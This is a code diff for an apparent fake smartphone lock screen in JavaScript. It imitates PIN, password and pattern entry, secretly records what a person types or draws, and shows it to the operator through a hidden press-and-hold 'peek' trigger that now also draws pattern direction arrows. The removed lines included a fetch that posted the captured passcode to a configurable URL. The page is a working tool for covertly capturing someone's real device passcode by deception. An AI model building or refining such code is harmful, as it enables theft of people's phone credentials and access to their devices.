@@ -3,7 +3,7 @@ let forceSuccess = false;
 let currentInput = "";
 let peekData = null;
 let lastTap = 0;
-let holdTimer;
+let tripleTapCheck = 0;
 
 const config = {
     mode: "pin4",
@@ -13,22 +13,30 @@ const config = {
     url: "YOUR_URL_HERE"
 };
 
+// PERSISTENCE & TIME
 window.onload = () => {
     const saved = localStorage.getItem('lockscreen_settings');
-    if (saved) {
-        const data = JSON.parse(saved);
-        Object.assign(config, data);
-        document.getElementById('lock-type').value = config.mode;
-        document.getElementById('success-try').value = config.successAt;
-        document.getElementById('peek-try').value = config.peekAt;
-        document.getElementById('send-try').value = config.sendAt;
-        document.getElementById('script-url').value = config.url;
-    }
+    if (saved) Object.assign(config, JSON.parse(saved));
     updateTime();
-    setInterval(updateTime, 10000);
 };
 
+// TRIPLE TAP BACK GESTURE
+document.addEventListener('touchstart', (e) => {
+    const now = Date.now();
+    if (now - tripleTapCheck < 500) {
+        tripleTapCheck = now;
+        lastTapCount++;
+        if(lastTapCount === 3) {
+            location.reload(); // Returns to setup
+        }
+    } else {
+        lastTapCount = 1;
+        tripleTapCheck = now;
+    }
+});
+
 document.getElementById('start-app').addEventListener('click', () => {
+    // Collect from inputs
     config.mode = document.getElementById('lock-type').value;
     config.successAt = parseInt(document.getElementById('success-try').value);
     config.peekAt = parseInt(document.getElementById('peek-try').value);
@@ -42,40 +50,31 @@ document.getElementById('start-app').addEventListener('click', () => {
 });
 
 function initLockMode() {
-    if (config.mode.includes('pin')) {
+    if (config.mode === 'password') {
+        document.getElementById('password-tap-zone').classList.remove('hidden');
+        document.getElementById('hidden-pass-input').focus();
+    } else if (config.mode === 'pattern') {
+        document.getElementById('pattern-canvas').classList.remove('hidden');
+        drawDots();
+    } else {
         const dots = config.mode === 'pin4' ? 4 : 6;
         document.getElementById('pin-dots').innerHTML = '<div class="dot"></div>'.repeat(dots);
         document.getElementById('pin-dots').classList.remove('hidden');
         document.getElementById('pin-pad').classList.remove('hidden');
-    } else if (config.mode === 'password') {
-        document.getElementById('password-tap-zone').classList.remove('hidden');
-        const input = document.getElementById('hidden-pass-input');
-        input.addEventListener('keydown', (e) => { if(e.key === 'Enter') processEntry(input.value); });
-    } else {
-        document.getElementById('pattern-canvas').classList.remove('hidden');
-        drawDots(); 
     }
 }
 
-// Secret Trigger Logic (Both Lock and Home)
+// SECRET PEEK (1 SECOND)
 const triggers = ['secret-trigger-lock', 'secret-trigger-home'];
 triggers.forEach(id => {
     const el = document.getElementById(id);
-    const peekEl = id === 'secret-trigger-lock' ? 'peek-display' : 'peek-display-home';
+    const peekEl = id.includes('lock') ? 'peek-display' : 'peek-display-home';
     
-    el.addEventListener('contextmenu', e => e.preventDefault());
-    el.addEventListener('touchstart', e => {
-        const now = Date.now();
-        if (now - lastTap < 300) {
-            forceSuccess = !forceSuccess;
-            navigator.vibrate(20);
-            document.getElementById('active-dot').style.opacity = forceSuccess ? 0.8 : 0;
-        }
-        lastTap = now;
+    el.addEventListener('touchstart', () => {
         holdTimer = setTimeout(() => {
             drawPeek(peekEl);
             document.getElementById(peekEl).classList.remove('hidden');
-        }, 1500);
+        }, 1000); // Reduced to 1 second
     });
     el.addEventListener('touchend', () => {
         clearTimeout(holdTimer);
@@ -83,7 +82,7 @@ triggers.forEach(id => {
     });
 });
 
-// Pattern Drawing Logic
+// PATTERN & ARROW LOGIC
 const canvas = document.getElementById('pattern-canvas');
 const ctx = canvas.getContext('2d');
 const dots = [];
@@ -124,31 +123,57 @@ canvas.addEventListener('touchend', () => {
     currentPattern = []; drawDots();
 });
 
-// Core Processing
+function drawPeek(targetId) {
+    const pCanvas = document.getElementById(targetId);
+    const pCtx = pCanvas.getContext('2d');
+    pCtx.clearRect(0, 0, 100, 100);
+    if (!peekData) return;
+
+    pCtx.strokeStyle = "white"; pCtx.fillStyle = "white";
+    if (Array.isArray(peekData)) {
+        // Draw the Mini-Pattern
+        pCtx.lineWidth = 2;
+        pCtx.beginPath();
+        peekData.forEach((id, i) => {
+            const x = (id % 3) * 20 + 20; const y = Math.floor(id / 3) * 20 + 20;
+            if(i === 0) pCtx.moveTo(x,y); else pCtx.lineTo(x,y);
+            // Draw small arrow for direction
+            if(i > 0) drawArrow(pCtx, peekData[i-1], id);
+        });
+        pCtx.stroke();
+    } else {
+        pCtx.font = "bold 20px Arial"; pCtx.fillText(peekData, 10, 50);
+    }
+}
+
+function drawArrow(ctx, startId, endId) {
+    const x1 = (startId % 3) * 20 + 20; const y1 = Math.floor(startId / 3) * 20 + 20;
+    const x2 = (endId % 3) * 20 + 20; const y2 = Math.floor(endId / 3) * 20 + 20;
+    const midX = (x1 + x2) / 2; const midY = (y1 + y2) / 2;
+    const angle = Math.atan2(y2 - y1, x2 - x1);
+    ctx.moveTo(midX, midY);
+    ctx.lineTo(midX - 5 * Math.cos(angle - Math.PI / 6), midY - 5 * Math.sin(angle - Math.PI / 6));
+    ctx.moveTo(midX, midY);
+    ctx.lineTo(midX - 5 * Math.cos(angle + Math.PI / 6), midY - 5 * Math.sin(angle + Math.PI / 6));
+}
+
 function processEntry(val, isPattern = false) {
     attemptCount++;
     if (attemptCount === config.peekAt) peekData = isPattern ? val.split('-').map(Number) : val;
-    if (!isPattern && attemptCount === config.sendAt && config.url) {
-        fetch(config.url, {method: 'POST', mode: 'no-cors', body: JSON.stringify({passcode: val})});
-    }
-
     if (attemptCount === config.successAt || forceSuccess) {
         document.getElementById('unlock-sound').play();
         document.getElementById('lock-page').classList.add('hidden');
         document.getElementById('home-page').classList.remove('hidden');
     } else {
-        document.getElementById('lock-content').classList.add('shake');
         navigator.vibrate([50, 50, 50]);
-        setTimeout(() => document.getElementById('lock-content').classList.remove('shake'), 400);
         currentInput = "";
         document.querySelectorAll('.dot').forEach(d => d.classList.remove('filled'));
-        document.getElementById('hidden-pass-input').value = "";
     }
 }
 
 document.querySelectorAll('.num').forEach(btn => {
     btn.addEventListener('click', () => {
-        currentInput += btn.innerText;
+        currentInput += btn.innerText[0];
         const dot = document.querySelectorAll('.dot')[currentInput.length - 1];
         if (dot) dot.classList.add('filled');
         const limit = config.mode === 'pin4' ? 4 : 6;
@@ -156,28 +181,7 @@ document.querySelectorAll('.num').forEach(btn => {
     });
 });
 
-function drawPeek(targetCanvasId) {
-    const pCanvas = document.getElementById(targetCanvasId);
-    const pCtx = pCanvas.getContext('2d');
-    pCtx.clearRect(0, 0, 80, 80);
-    if (!peekData) return;
-
-    pCtx.fillStyle = "white";
-    if (Array.isArray(peekData)) {
-        pCtx.strokeStyle = "white"; pCtx.lineWidth = 2;
-        pCtx.beginPath();
-        peekData.forEach((id, i) => {
-            const x = (id % 3) * 20 + 20; const y = Math.floor(id / 3) * 20 + 20;
-            if(i === 0) pCtx.moveTo(x,y); else pCtx.lineTo(x,y);
-        });
-        pCtx.stroke();
-    } else {
-        pCtx.font = "bold 18px Arial"; pCtx.fillText(peekData, 10, 45);
-    }
-}
-
 function updateTime() {
     const now = new Date();
-    const timeStr = now.getHours() + ":" + now.getMinutes().toString().padStart(2, '0');
-    document.querySelector('.clock').innerText = timeStr;
+    document.querySelector('.clock').innerText = now.getHours() + ":" + now.getMinutes().toString().padStart(2, '0');
 }
